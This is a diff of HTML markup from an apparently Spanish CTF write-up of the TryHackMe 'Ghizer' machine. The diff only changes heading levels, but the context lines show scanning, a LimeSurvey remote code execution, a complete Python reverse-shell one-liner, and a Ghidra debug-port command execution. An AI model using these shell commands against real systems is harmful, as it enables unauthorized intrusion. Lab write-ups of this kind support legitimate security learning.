@@ -43,7 +43,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -70,7 +70,7 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), ssl/https (443), servicio de java(?) (18002) y algunos otros puertos abiertos que no logramos obtener informacion.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -332,7 +332,7 @@ SF:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;X11Probe,58,&lt;span class=&#34;s
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous) en el cual encontramos varios archivos entre ellos las flag &lt;code&gt;root.txt&lt;/code&gt; y &lt;code&gt;user.txt&lt;/code&gt;, al intentar obtener uno de estos archivos muestra un mensaje de permiso denegado por lo que no logramos hacer nada en este servicio, además es muy raro porque comunmente es posible realizar &lt;code&gt;ls -lah&lt;/code&gt; para observar los archivos ocultos, algo que no se pudo lograr en este servicio.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -408,7 +408,7 @@ ftp&amp;gt; bye
 kali@kali:~/thm/ghizer$
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80, al parecer es una aplicacion web para realizar encuestas.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-30-16.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
@@ -451,7 +451,7 @@ kali@kali:~/thm/ghizer$
 /server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;limesurvey---rce-&#34;&gt;LimeSurvey - RCE&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;limesurvey---rce&#34;&gt;LimeSurvey - RCE&lt;/h1&gt;
 &lt;p&gt;Encontramos un exploit que afecta a esta aplicacion la cual necesita unas credenciales para subir una shell y ejecutar comandos, utilizamos las credenciales por defecto y ejecutamos el exploit con los parametros necesarios. Vemos que el usuario que esta ejecutando la aplicacion es &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-35-02.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Actualizamos a una nueva shell en donde podamos realizar una enumeracion más comoda ejecutando una shell inversa de python.&lt;/p&gt;
@@ -463,7 +463,7 @@ kali@kali:~/thm/ghizer$
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.2.29.162&amp;#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ghidra-rce---veronica-&#34;&gt;GHIDRA RCE -&amp;gt; VERONICA&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ghidra-rce---veronica&#34;&gt;GHIDRA RCE -&amp;gt; VERONICA&lt;/h1&gt;
 &lt;p&gt;Realizamos una enumeracion en la maquina y vemos que en el directorio principal de la usuario &lt;code&gt;veronica&lt;/code&gt; esta &lt;code&gt;Ghidra&lt;/code&gt;, además de ello vemos los puertos abiertos en la maquina (ojo con 18001).&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-38-15.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_02-47-45.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -493,7 +493,7 @@ print new java.lang.Runtime&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;.exec&lt
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_03-20-39.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt; y una shell con la usuario &lt;code&gt;Veronica&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_2020-08-14_03-36-14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion en la carpeta principal de &lt;code&gt;veronica&lt;/code&gt; y vemos un script en python el cual codifica el mensaje &lt;code&gt;tryhackme is the best&lt;/code&gt; y además la variable podria darnos una pista de lo que debemos de hacer.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
